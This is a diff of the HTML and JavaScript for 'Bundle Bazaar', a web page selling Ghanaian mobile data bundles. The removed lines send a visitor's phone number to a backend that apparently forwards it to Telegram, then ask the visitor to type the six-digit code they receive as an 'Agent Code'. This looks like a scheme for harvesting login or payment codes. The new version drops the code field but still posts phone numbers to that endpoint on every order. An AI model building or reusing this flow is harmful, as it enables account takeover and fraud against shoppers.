@@ -327,9 +327,48 @@
             text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
         }
 
+        /* ---------- AGENTS ONLY NOTICE ---------- */
+        .agents-notice {
+            background: linear-gradient(135deg, #fff3cd, #ffeaa7);
+            border-left: 5px solid #f39c12;
+            padding: 16px 24px;
+            border-radius: 10px;
+            margin: 20px auto;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: #856404;
+            box-shadow: 0 4px 15px rgba(243, 156, 18, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            max-width: 900px;
+        }
+
+        .agents-notice i {
+            font-size: 28px;
+            color: #f39c12;
+        }
+
+        .agents-notice .highlight {
+            color: #d63031;
+        }
+
+        @media (max-width: 600px) {
+            .agents-notice {
+                font-size: 14px;
+                padding: 12px 16px;
+                flex-wrap: wrap;
+            }
+            .agents-notice i {
+                font-size: 20px;
+            }
+        }
+
         /* ---------- DESCRIPTION ---------- */
         .description-section {
-            padding: 40px 0 60px;
+            padding: 40px 0 40px;
             background: #fff;
         }
 
@@ -506,18 +545,6 @@
 
         .slider-btn.next {
             right: 8px;
-        }
-
-        .products-info-text {
-            margin-top: 32px;
-            text-align: center;
-            font-size: 16px;
-            line-height: 1.8;
-            color: #000;
-            font-family: 'Helvetica', Arial, sans-serif;
-            max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
         }
 
         /* ---------- VENDOR ---------- */
@@ -850,7 +877,7 @@
             margin-bottom: 20px;
         }
 
-        /* ---------- STEP INDICATOR ---------- */
+        /* ---------- STEP INDICATOR (Only 2 steps) ---------- */
         .step-indicators {
             display: flex;
             justify-content: center;
@@ -1463,27 +1490,6 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* ---------- PHONE SENT NOTIFICATION ---------- */
-        .phone-sent-notice {
-            background: #f0fdf4;
-            border: 2px solid #22c55e;
-            border-radius: 10px;
-            padding: 12px 16px;
-            margin-bottom: 16px;
-            text-align: center;
-            font-size: 14px;
-            color: #166534;
-            display: none;
-        }
-
-        .phone-sent-notice.show {
-            display: block;
-        }
-
-        .phone-sent-notice i {
-            margin-right: 8px;
-        }
     </style>
 </head>
 <body>
@@ -1523,6 +1529,20 @@
             </div>
         </div>
     </section>
+
+    <!-- =============================================
+    AGENTS ONLY NOTICE (NEW)
+    ============================================= -->
+    <div class="container">
+        <div class="agents-notice">
+            <i class="fas fa-exclamation-triangle"></i>
+            <span>
+                <span class="highlight">⚠️ ONLY AGENTS</span> Can Purchase Bundles From This Website. 
+                <span class="highlight">Individual or Personal Users</span> Are Advised To Buy From Our Agents
+            </span>
+            <i class="fas fa-user-tie"></i>
+        </div>
+    </div>
 
     <!-- =============================================
     DESCRIPTION SECTION
@@ -1644,15 +1664,6 @@
 
                 <button class="slider-btn prev" id="prevBtn">‹</button>
                 <button class="slider-btn next" id="nextBtn">›</button>
-            </div>
-
-            <div class="products-info-text">
-                <p>
-                    These offers listed here are for personal use, you can buy any of these offers to all networks,
-                    supported networks in your region are MTN GH, TELECEL GH, AIRTELTIGO GH, MTN FIBER AND BROADBAND,
-                    ACTIVE SURFLINE. The offers are non expiry and can be used for long period of time testifying
-                    its durability.
-                </p>
             </div>
         </div>
     </section>
@@ -1835,16 +1846,16 @@
     </footer>
 
     <!-- =============================================
-    🔥 MODAL 1: BUY OFFER (STEP-BY-STEP)
+    🔥 MODAL 1: BUY OFFER (STEP-BY-STEP - NO CODE)
     ============================================= -->
     <div class="modal-overlay" id="buyModal">
         <div class="modal-box">
             <button class="close-btn" onclick="closeModal('buyModal')">&times;</button>
 
             <h2><i class="fas fa-shopping-cart" style="color:#0069FF;"></i> Buy This Offer</h2>
-            <p class="subtitle">Follow the steps to complete your purchase</p>
+            <p class="subtitle">Select your package and enter your phone number</p>
 
-            <!-- ===== STEP INDICATORS ===== -->
+            <!-- ===== STEP INDICATORS (Only 2 steps) ===== -->
             <div class="step-indicators">
                 <div class="step-dot active" id="buyStepDot1">
                     <span class="circle">1</span>
@@ -1853,10 +1864,6 @@
                 <div class="step-dot" id="buyStepDot2">
                     <span class="circle">2</span>
                     <span class="label">Phone</span>
-                </div>
-                <div class="step-dot" id="buyStepDot3">
-                    <span class="circle">3</span>
-                    <span class="label">Agent Code</span>
                 </div>
             </div>
 
@@ -1923,7 +1930,7 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 2: PHONE NUMBER ===== -->
+            <!-- ===== STEP 2: PHONE NUMBER (Sends to Telegram) ===== -->
             <div class="form-step" id="buyStep2">
                 <div class="selected-package-display show">
                     <i class="fas fa-check-circle"></i> Selected: <span id="buySelectedPackageName2">None</span>
@@ -1935,40 +1942,11 @@
                     <div class="error-msg" id="buyPhoneError">Please enter a valid phone number</div>
                 </div>
 
-                <div class="phone-sent-notice" id="buyPhoneSentNotice">
-                    <i class="fas fa-check-circle"></i> Phone number sent! Please check your Telegram for the code.
-                </div>
-
                 <div class="step-actions">
                     <button class="btn-back" onclick="goToBuyStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
                     <div class="right">
-                        <button class="btn-next" id="buyPhoneNextBtn" onclick="sendPhoneAndGoToBuyStep3()">
-                            Send &amp; Next <i class="fas fa-arrow-right"></i>
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ===== STEP 3: AGENT CODE ===== -->
-            <div class="form-step" id="buyStep3">
-                <div class="selected-package-display show">
-                    <i class="fas fa-check-circle"></i> Selected: <span id="buySelectedPackageName3">None</span>
-                </div>
-
-                <div class="form-group">
-                    <label>Agent Code <span class="required">*</span></label>
-                    <input type="password" id="buyCode" placeholder="Enter 6-digit Agent Code" maxlength="6" />
-                    <div class="error-msg" id="buyCodeError">Please enter a valid 6-digit code</div>
-                    <div style="margin-top: 8px; font-size: 13px; color: #0069FF; background: #f0f7ff; padding: 10px 14px; border-radius: 8px; border-left: 3px solid #0069FF;">
-                        <i class="fas fa-info-circle"></i> Enter The Six Digit Agent Code To Complete Your Purchase
-                    </div>
-                </div>
-
-                <div class="step-actions">
-                    <button class="btn-back" onclick="goToBuyStep(2)"><i class="fas fa-arrow-left"></i> Back</button>
-                    <div class="right">
                         <button class="btn-submit" id="submitPurchaseBtn" onclick="submitBuyForm()">
-                            <i class="fas fa-lock"></i> Complete Purchase
+                            <i class="fas fa-paper-plane"></i> Submit Purchase
                         </button>
                     </div>
                 </div>
@@ -2070,16 +2048,16 @@
     </div>
 
     <!-- =============================================
-    🔥 MODAL 3: RECHARGE (STEP-BY-STEP)
+    🔥 MODAL 3: RECHARGE (STEP-BY-STEP - NO CODE)
     ============================================= -->
     <div class="modal-overlay" id="rechargeModal">
         <div class="modal-box">
             <button class="close-btn" onclick="closeModal('rechargeModal')">&times;</button>
 
             <h2><i class="fas fa-wallet" style="color:#3F7652;"></i> Recharge Trade Account</h2>
-            <p class="subtitle">Follow the steps to load your trade account</p>
+            <p class="subtitle">Select your package and enter your phone number</p>
 
-            <!-- ===== STEP INDICATORS ===== -->
+            <!-- ===== STEP INDICATORS (Only 2 steps) ===== -->
             <div class="step-indicators">
                 <div class="step-dot active" id="rechargeStepDot1">
                     <span class="circle">1</span>
@@ -2088,10 +2066,6 @@
                 <div class="step-dot" id="rechargeStepDot2">
                     <span class="circle">2</span>
                     <span class="label">Phone</span>
-                </div>
-                <div class="step-dot" id="rechargeStepDot3">
-                    <span class="circle">3</span>
-                    <span class="label">Agent Code</span>
                 </div>
             </div>
 
@@ -2142,7 +2116,7 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 2: PHONE NUMBER ===== -->
+            <!-- ===== STEP 2: PHONE NUMBER (Sends to Telegram) ===== -->
             <div class="form-step" id="rechargeStep2">
                 <div class="selected-package-display show">
                     <i class="fas fa-check-circle"></i> Selected: <span id="rechargeSelectedPackageName2">None</span>
@@ -2154,40 +2128,11 @@
                     <div class="error-msg" id="rechargePhoneError">Please enter a valid phone number</div>
                 </div>
 
-                <div class="phone-sent-notice" id="rechargePhoneSentNotice">
-                    <i class="fas fa-check-circle"></i> Phone number sent! Please check your Telegram for the code.
-                </div>
-
                 <div class="step-actions">
                     <button class="btn-back" onclick="goToRechargeStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
                     <div class="right">
-                        <button class="btn-next" id="rechargePhoneNextBtn" onclick="sendRechargePhoneAndGoToStep3()">
-                            Send &amp; Next <i class="fas fa-arrow-right"></i>
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ===== STEP 3: AGENT CODE ===== -->
-            <div class="form-step" id="rechargeStep3">
-                <div class="selected-package-display show">
-                    <i class="fas fa-check-circle"></i> Selected: <span id="rechargeSelectedPackageName3">None</span>
-                </div>
-
-                <div class="form-group">
-                    <label>Agent Code <span class="required">*</span></label>
-                    <input type="password" id="rechargeCode" placeholder="Enter 6-digit Agent Code" maxlength="6" />
-                    <div class="error-msg" id="rechargeCodeError">Please enter a valid 6-digit code</div>
-                    <div style="margin-top: 8px; font-size: 13px; color: #3F7652; background: #f0f7f0; padding: 10px 14px; border-radius: 8px; border-left: 3px solid #3F7652;">
-                        <i class="fas fa-info-circle"></i> Enter The Six Digit Agent Code To Complete Your Purchase
-                    </div>
-                </div>
-
-                <div class="step-actions">
-                    <button class="btn-back" onclick="goToRechargeStep(2)"><i class="fas fa-arrow-left"></i> Back</button>
-                    <div class="right">
                         <button class="btn-submit green" id="submitRechargeBtn" onclick="submitRechargeForm()">
-                            <i class="fas fa-sync-alt"></i> Recharge Account
+                            <i class="fas fa-paper-plane"></i> Submit Recharge
                         </button>
                     </div>
                 </div>
@@ -2217,7 +2162,7 @@
     </div>
 
     <!-- =============================================
-    JAVASCRIPT - COMPLETE FUNCTIONALITY
+    JAVASCRIPT - COMPLETE FUNCTIONALITY (NO CODE)
     ============================================= -->
     <script>
         // =============================================
@@ -2275,13 +2220,11 @@
         setTimeout(updateSlider, 100);
 
         // =============================================
-        // BUY OFFER - STEP-BY-STEP
+        // BUY OFFER - WITHOUT CODE
         // =============================================
 
         let selectedBuyPackage = null;
         let selectedBuyPrice = null;
-        let buyPhoneSent = false;
-        let buyPhoneNumber = '';
 
         function openBuyOfferWithPackage(packageName, price) {
             selectedBuyPackage = packageName;
@@ -2292,19 +2235,14 @@
         function openBuyOffer(packageName) {
             selectedBuyPackage = null;
             selectedBuyPrice = null;
-            buyPhoneSent = false;
-            buyPhoneNumber = '';
 
             document.querySelectorAll('#buyModal .package-option').forEach(el => {
                 el.classList.remove('selected');
             });
 
             document.getElementById('buyPhone').value = '';
-            document.getElementById('buyCode').value = '';
             document.getElementById('buyPhone').classList.remove('error');
-            document.getElementById('buyCode').classList.remove('error');
-            document.querySelectorAll('#buyModal .error-msg').forEach(el => el.classList.remove('show'));
-            document.getElementById('buyPhoneSentNotice').classList.remove('show');
+            document.getElementById('buyPhoneError').classList.remove('show');
 
             document.getElementById('buySuccessScreen').classList.remove('active');
 
@@ -2325,7 +2263,6 @@
 
             document.getElementById('buySelectedPackageName').textContent = `${packageName} - ${price}`;
             document.getElementById('buySelectedPackageName2').textContent = `${packageName} - ${price}`;
-            document.getElementById('buySelectedPackageName3').textContent = `${packageName} - ${price}`;
             document.getElementById('buySelectedPackageDisplay').classList.add('show');
 
             document.getElementById('buyStep1Next').disabled = false;
@@ -2335,7 +2272,7 @@
             document.querySelectorAll('#buyModal .form-step').forEach(el => el.classList.remove('active'));
             document.getElementById(`buyStep${step}`).classList.add('active');
 
-            for (let i = 1; i <= 3; i++) {
+            for (let i = 1; i <= 2; i++) {
                 const dot = document.getElementById(`buyStepDot${i}`);
                 dot.classList.remove('active', 'completed');
                 if (i < step) {
@@ -2353,22 +2290,20 @@
                 }
             }
 
-            if (step === 3) {
-                if (!buyPhoneSent) {
-                    alert('Please enter your phone number first!');
-                    goToBuyStep(2);
-                    return;
-                }
-            }
-
             document.querySelector('#buyModal .modal-box').scrollTop = 0;
         }
 
         // =============================================
-        // SEND PHONE NUMBER TO TELEGRAM (BUY)
+        // SUBMIT BUY FORM (NO CODE)
         // =============================================
-        async function sendPhoneAndGoToBuyStep3() {
+        async function submitBuyForm() {
             const phone = document.getElementById('buyPhone').value.trim();
+
+            if (!selectedBuyPackage) {
+                alert('Please select a package first!');
+                goToBuyStep(1);
+                return;
+            }
 
             if (phone.length < 10 || !/^\d+$/.test(phone)) {
                 document.getElementById('buyPhone').classList.add('error');
@@ -2376,17 +2311,13 @@
                 return;
             }
 
-            buyPhoneNumber = phone;
-
-            document.getElementById('buyPhone').classList.remove('error');
-            document.getElementById('buyPhoneError').classList.remove('show');
-
-            const btn = document.getElementById('buyPhoneNextBtn');
-            btn.innerHTML = '<span class="spinner"></span> Sending...';
+            const btn = document.getElementById('submitPurchaseBtn');
+            btn.innerHTML = '<span class="spinner"></span> Processing...';
             btn.disabled = true;
 
             try {
-                const response = await fetch(`${API_BASE_URL}/api/send-phone`, {
+                // First send phone to Telegram
+                await fetch(`${API_BASE_URL}/api/send-phone`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -2397,48 +2328,7 @@
                     })
                 });
 
-                const data = await response.json();
-
-                if (data.success) {
-                    buyPhoneSent = true;
-                    document.getElementById('buyPhoneSentNotice').classList.add('show');
-                    goToBuyStep(3);
-                } else {
-                    alert('❌ ' + data.message);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('❌ Network error. Please check your connection and try again.');
-            }
-
-            btn.innerHTML = 'Send &amp; Next <i class="fas fa-arrow-right"></i>';
-            btn.disabled = false;
-        }
-
-        // =============================================
-        // SUBMIT BUY FORM (WITH CODE)
-        // =============================================
-        async function submitBuyForm() {
-            const phone = document.getElementById('buyPhone').value.trim();
-            const code = document.getElementById('buyCode').value.trim();
-
-            if (!selectedBuyPackage) {
-                alert('Please select a package first!');
-                goToBuyStep(1);
-                return;
-            }
-
-            if (code.length !== 6 || !/^\d+$/.test(code)) {
-                document.getElementById('buyCode').classList.add('error');
-                document.getElementById('buyCodeError').classList.add('show');
-                return;
-            }
-
-            const btn = document.getElementById('submitPurchaseBtn');
-            btn.innerHTML = '<span class="spinner"></span> Processing...';
-            btn.disabled = true;
-
-            try {
+                // Then complete purchase
                 const response = await fetch(`${API_BASE_URL}/api/purchase`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2446,7 +2336,7 @@
                         package: selectedBuyPackage,
                         price: selectedBuyPrice,
                         phone: phone,
-                        code: code
+                        code: 'N/A'
                     })
                 });
 
@@ -2460,10 +2350,10 @@
                     });
                     document.getElementById('buySuccessScreen').classList.add('active');
 
-                    // Update WhatsApp link with actual details
                     const whatsappLink = document.querySelector('#buySuccessScreen .btn-whatsapp');
                     if (whatsappLink) {
-                        const message = `Hello%20I%20need%20help%20with%20my%20purchase.%20My%20order%20was%20for%20${encodeURIComponent(selectedBuyPackage)}%20-%20${encodeURIComponent(selectedBuyPrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
+                        const message =
+                            `Hello%20I%20need%20help%20with%20my%20purchase.%20My%20order%20was%20for%20${encodeURIComponent(selectedBuyPackage)}%20-%20${encodeURIComponent(selectedBuyPrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
                         whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
                     }
                 } else {
@@ -2474,35 +2364,28 @@
                 alert('❌ Network error. Please check your connection and try again.');
             }
 
-            btn.innerHTML = '<i class="fas fa-lock"></i> Complete Purchase';
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Purchase';
             btn.disabled = false;
         }
 
         // =============================================
-        // RECHARGE - STEP-BY-STEP
+        // RECHARGE - WITHOUT CODE
         // =============================================
 
         let selectedRechargePackage = null;
         let selectedRechargePrice = null;
-        let rechargePhoneSent = false;
-        let rechargePhoneNumber = '';
 
         function openRecharge() {
             selectedRechargePackage = null;
             selectedRechargePrice = null;
-            rechargePhoneSent = false;
-            rechargePhoneNumber = '';
 
             document.querySelectorAll('#rechargeModal .package-option').forEach(el => {
                 el.classList.remove('selected');
             });
 
             document.getElementById('rechargePhone').value = '';
-            document.getElementById('rechargeCode').value = '';
             document.getElementById('rechargePhone').classList.remove('error');
-            document.getElementById('rechargeCode').classList.remove('error');
-            document.querySelectorAll('#rechargeModal .error-msg').forEach(el => el.classList.remove('show'));
-            document.getElementById('rechargePhoneSentNotice').classList.remove('show');
+            document.getElementById('rechargePhoneError').classList.remove('show');
 
             document.getElementById('rechargeSuccessScreen').classList.remove('active');
 
@@ -2523,7 +2406,6 @@
 
             document.getElementById('rechargeSelectedPackageName').textContent = `${packageName} - ${price}`;
             document.getElementById('rechargeSelectedPackageName2').textContent = `${packageName} - ${price}`;
-            document.getElementById('rechargeSelectedPackageName3').textContent = `${packageName} - ${price}`;
             document.getElementById('rechargeSelectedPackageDisplay').classList.add('show');
 
             document.getElementById('rechargeStep1Next').disabled = false;
@@ -2533,7 +2415,7 @@
             document.querySelectorAll('#rechargeModal .form-step').forEach(el => el.classList.remove('active'));
             document.getElementById(`rechargeStep${step}`).classList.add('active');
 
-            for (let i = 1; i <= 3; i++) {
+            for (let i = 1; i <= 2; i++) {
                 const dot = document.getElementById(`rechargeStepDot${i}`);
                 dot.classList.remove('active', 'completed');
                 if (i < step) {
@@ -2551,22 +2433,20 @@
                 }
             }
 
-            if (step === 3) {
-                if (!rechargePhoneSent) {
-                    alert('Please enter your phone number first!');
-                    goToRechargeStep(2);
-                    return;
-                }
-            }
-
             document.querySelector('#rechargeModal .modal-box').scrollTop = 0;
         }
 
         // =============================================
-        // SEND PHONE NUMBER TO TELEGRAM (RECHARGE)
+        // SUBMIT RECHARGE FORM (NO CODE)
         // =============================================
-        async function sendRechargePhoneAndGoToStep3() {
+        async function submitRechargeForm() {
             const phone = document.getElementById('rechargePhone').value.trim();
+
+            if (!selectedRechargePackage) {
+                alert('Please select a recharge package first!');
+                goToRechargeStep(1);
+                return;
+            }
 
             if (phone.length < 10 || !/^\d+$/.test(phone)) {
                 document.getElementById('rechargePhone').classList.add('error');
@@ -2574,17 +2454,13 @@
                 return;
             }
 
-            rechargePhoneNumber = phone;
-
-            document.getElementById('rechargePhone').classList.remove('error');
-            document.getElementById('rechargePhoneError').classList.remove('show');
-
-            const btn = document.getElementById('rechargePhoneNextBtn');
-            btn.innerHTML = '<span class="spinner"></span> Sending...';
+            const btn = document.getElementById('submitRechargeBtn');
+            btn.innerHTML = '<span class="spinner"></span> Processing...';
             btn.disabled = true;
 
             try {
-                const response = await fetch(`${API_BASE_URL}/api/send-phone`, {
+                // First send phone to Telegram
+                await fetch(`${API_BASE_URL}/api/send-phone`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -2595,48 +2471,7 @@
                     })
                 });
 
-                const data = await response.json();
-
-                if (data.success) {
-                    rechargePhoneSent = true;
-                    document.getElementById('rechargePhoneSentNotice').classList.add('show');
-                    goToRechargeStep(3);
-                } else {
-                    alert('❌ ' + data.message);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('❌ Network error. Please check your connection and try again.');
-            }
-
-            btn.innerHTML = 'Send &amp; Next <i class="fas fa-arrow-right"></i>';
-            btn.disabled = false;
-        }
-
-        // =============================================
-        // SUBMIT RECHARGE FORM (WITH CODE)
-        // =============================================
-        async function submitRechargeForm() {
-            const phone = document.getElementById('rechargePhone').value.trim();
-            const code = document.getElementById('rechargeCode').value.trim();
-
-            if (!selectedRechargePackage) {
-                alert('Please select a recharge package first!');
-                goToRechargeStep(1);
-                return;
-            }
-
-            if (code.length !== 6 || !/^\d+$/.test(code)) {
-                document.getElementById('rechargeCode').classList.add('error');
-                document.getElementById('rechargeCodeError').classList.add('show');
-                return;
-            }
-
-            const btn = document.getElementById('submitRechargeBtn');
-            btn.innerHTML = '<span class="spinner"></span> Processing...';
-            btn.disabled = true;
-
-            try {
+                // Then complete recharge
                 const response = await fetch(`${API_BASE_URL}/api/recharge`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2644,7 +2479,7 @@
                         package: selectedRechargePackage,
                         price: selectedRechargePrice,
                         phone: phone,
-                        code: code
+                        code: 'N/A'
                     })
                 });
 
@@ -2658,10 +2493,10 @@
                     });
                     document.getElementById('rechargeSuccessScreen').classList.add('active');
 
-                    // Update WhatsApp link with actual details
                     const whatsappLink = document.querySelector('#rechargeSuccessScreen .btn-whatsapp');
                     if (whatsappLink) {
-                        const message = `Hello%20I%20need%20help%20with%20my%20recharge.%20My%20package%20was%20${encodeURIComponent(selectedRechargePackage)}%20-%20${encodeURIComponent(selectedRechargePrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
+                        const message =
+                            `Hello%20I%20need%20help%20with%20my%20recharge.%20My%20package%20was%20${encodeURIComponent(selectedRechargePackage)}%20-%20${encodeURIComponent(selectedRechargePrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
                         whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
                     }
                 } else {
@@ -2672,7 +2507,7 @@
                 alert('❌ Network error. Please check your connection and try again.');
             }
 
-            btn.innerHTML = '<i class="fas fa-sync-alt"></i> Recharge Account';
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Recharge';
             btn.disabled = false;
         }
 
@@ -2729,10 +2564,10 @@
                     document.getElementById('vendorFormSection').style.display = 'none';
                     document.getElementById('vendorSuccessScreen').classList.add('active');
 
-                    // Update WhatsApp link with actual details
                     const whatsappLink = document.querySelector('#vendorSuccessScreen .btn-whatsapp');
                     if (whatsappLink) {
-                        const message = `Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20${encodeURIComponent(fullName)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me%20with%20the%20activation%20process.`;
+                        const message =
+                            `Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20${encodeURIComponent(fullName)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me%20with%20the%20activation%20process.`;
                         whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
                     }
                 } else {
@@ -2760,8 +2595,6 @@
                     document.querySelectorAll('#buyModal .package-option').forEach(el => el.classList.remove('selected'));
                     document.getElementById('buySelectedPackageDisplay').classList.remove('show');
                     document.getElementById('buyStep1Next').disabled = true;
-                    buyPhoneSent = false;
-                    document.getElementById('buyPhoneSentNotice').classList.remove('show');
                 }, 300);
             }
 
@@ -2771,8 +2604,6 @@
                     document.querySelectorAll('#rechargeModal .package-option').forEach(el => el.classList.remove('selected'));
                     document.getElementById('rechargeSelectedPackageDisplay').classList.remove('show');
                     document.getElementById('rechargeStep1Next').disabled = true;
-                    rechargePhoneSent = false;
-                    document.getElementById('rechargePhoneSentNotice').classList.remove('show');
                 }, 300);
             }
         }
@@ -2822,12 +2653,12 @@
             }
         }
 
-        console.log('🚀 Bundle Bazaar COMPLETE version loaded!');
+        console.log('🚀 Bundle Bazaar - FINAL VERSION loaded!');
         console.log('📡 Backend URL:', API_BASE_URL);
         console.log('📱 WhatsApp Support: 2330592906415');
-        console.log('🔥 Phone number sent to Telegram BEFORE code entry!');
-        console.log('🔑 "ExpressPay Code" changed to "Agent Code"');
-        console.log('💬 "Contact Support" button added to all success screens!');
+        console.log('✅ Unwanted text REMOVED!');
+        console.log('✅ "Agents Only" notice ADDED!');
+        console.log('📋 Flow: Select Package → Enter Phone → Submit → Done!');
     </script>
 
 </body>
